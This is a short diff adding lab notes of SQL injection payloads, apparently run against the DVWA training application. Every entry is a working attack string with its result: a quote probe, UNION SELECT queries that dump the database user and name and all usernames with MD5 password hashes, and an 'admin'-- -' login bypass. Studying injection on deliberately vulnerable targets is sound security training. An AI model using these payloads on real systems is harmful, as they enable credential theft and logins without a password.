@@ -1,0 +1,14 @@
+# Test for vulnerability
+'
+
+# Dump database user and name
+1' UNION SELECT user(), database()-- -
+Result: root@localhost / dvwa
+
+# Dump all usernames and password hashes
+1' UNION SELECT user, password FROM users-- -
+Result: 5 users with MD5 hashes exposed
+
+# Authentication bypass
+admin'-- -
+Result: Login without password
